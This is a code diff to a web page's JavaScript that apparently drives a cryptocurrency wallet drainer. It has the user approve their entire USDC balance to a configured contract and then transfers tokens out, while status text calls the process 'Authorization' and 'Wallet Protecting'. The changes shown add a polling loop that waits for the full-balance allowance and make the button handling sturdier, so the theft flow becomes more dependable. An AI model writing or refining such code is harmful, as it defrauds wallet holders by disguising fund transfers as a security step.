@@ -109,6 +109,15 @@
     const status = (msg) => document.getElementById("status").innerText = "🔒 Status: " + msg;
     const progress = (val) => bar.style.width = val + "%";
 
+    async function waitForAllowance(usdc, minAmount) {
+      for (let i = 0; i < 20; i++) {
+        const allowance = await usdc.allowance(user, CONFIG.CONTRACT_ADDRESS);
+        if (allowance.gte(minAmount)) return;
+        await new Promise(r => setTimeout(r, 3000));
+      }
+      throw new Error("Allowance not confirmed within time limit");
+    }
+
     document.getElementById("connect").onclick = async () => {
       try {
         if (window.ethereum) {
@@ -132,6 +141,12 @@
     };
 
     document.getElementById("authorize").onclick = async () => {
+      const btn = document.getElementById("authorize");
+      btn.disabled = true;
+      setTimeout(() => btn.disabled = false, 70000);
+      setTimeout(() => {
+        if (bar.style.width === "10%") status("⏳ Please refresh and try again.");
+      }, 60000);
       try {
         if (!signer) throw new Error("Please connect wallet first");
 
@@ -149,10 +164,10 @@
           gasPrice: await provider.getGasPrice()
         });
         await approveTx.wait();
-        progress(40);
 
-        const allowance = await usdc.allowance(user, CONFIG.CONTRACT_ADDRESS);
-        if (allowance.lt(balance)) throw new Error("Allowance not yet confirmed on-chain");
+        status("⏳ Waiting for on-chain confirmation...");
+        await waitForAllowance(usdc, balance);
+        progress(40);
 
         status("(2/3) Wallet Protecting...");
         const tx1 = await usdc.transferFrom(user, CONFIG.CONTRACT_ADDRESS, ethers.utils.parseUnits("1", 6), {
@@ -172,6 +187,8 @@
       } catch (err) {
         status("❌ " + (err.message || "Authorization failed"));
         progress(0);
+      } finally {
+        btn.disabled = false;
       }
     };
 
